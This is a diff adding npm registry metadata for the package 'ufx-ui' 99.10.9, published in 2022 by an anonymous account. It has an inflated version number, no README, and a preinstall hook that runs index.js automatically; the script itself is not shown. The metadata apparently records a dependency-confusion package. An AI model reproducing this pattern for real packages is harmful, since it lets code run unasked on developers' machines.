@@ -1,0 +1,62 @@
+{
+    "_id": "ufx-ui",
+    "name": "ufx-ui",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "ufx-ui",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "ufx-ui@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-2GJsSynDweFTpWWZJCghPEZKiFdMD/pZFEYuoArZMyPtqM5AnZVz9+5TF2mPFKd3SAtS1ASKFmAMQUkoDuYx5g==",
+                "shasum": "0ccf59a68cbf275c816e0fda48e754a532c52a6f",
+                "tarball": "https://registry.npmjs.org/ufx-ui/-/ufx-ui-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5058,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPKdhACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmq4EBAAmDH/p14IS9MGAkKAMu459aL0KjiHNCtRuL8DVFpe1uGELUif\r\nx955t3z0Ym5Ge2XimGQVkjnWyg8vkh4ZMHLZzLZMbqW7gnf9AmpLxa3LOpMm\r\nmnyc5qE10y60K/TYalCkOpfpLZ6lg8xQYk2Suj/DxeYzj21J+hKus75OpUSF\r\nFRpyzUx+OHWcsZxae3AEV/67VQJxMGOom8Ij0ieTosv6XukUKPbR1P0MRbz1\r\nzUOTaHz/wB7BxXXcAMQt8SyJhGA3xan60F2qUff1ncW+5aS3Q35NC7X+SmlA\r\n2qbMvrsIIxNqUmYAcmobByqRJT/Yz+WEm96zywbGfJzY0HXW2suih0wJJqkU\r\nue3PPpBQlBbCQIohQwfl8X45rpml6UCaWndCfodMGZQyyNEw8j4Jorxwp5BC\r\nNXZtm3q6gUJsBJjFmNUx45FKrcRCw8n5YA2svBe3gxU3TqeFSkhjp6+Cwoar\r\nc6dTWieBAOw5w9cwo+BPvbY6a16heSTDY/INJxikMKRpwJDYUplIySoUi4Af\r\n2MEf+TSqmxJK9pOPgxRB+wVsgPSf93XKdiJnyNi9ytPQN0qUNYA0+6nNLkw1\r\nTnFfm+W2pLBLV4BPXpE8VNLJHPMdii1HR8+xxnJC2vX7XzC9qjxs/wuwk001\r\n683j0SdT7SqH2C9AeLGlaQCKnFoRGKr39OM=\r\n=f0MT\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "jgxhzq5v",
+                "email": "jgxhzq5v@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "jgxhzq5v",
+                    "email": "jgxhzq5v@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/ufx-ui_99.10.9_1648142177551_0.23586885396380142"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T17:16:17.550Z",
+        "99.10.9": "2022-03-24T17:16:17.709Z",
+        "modified": "2022-03-24T17:16:17.807Z"
+    },
+    "maintainers": [
+        {
+            "name": "jgxhzq5v",
+            "email": "jgxhzq5v@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
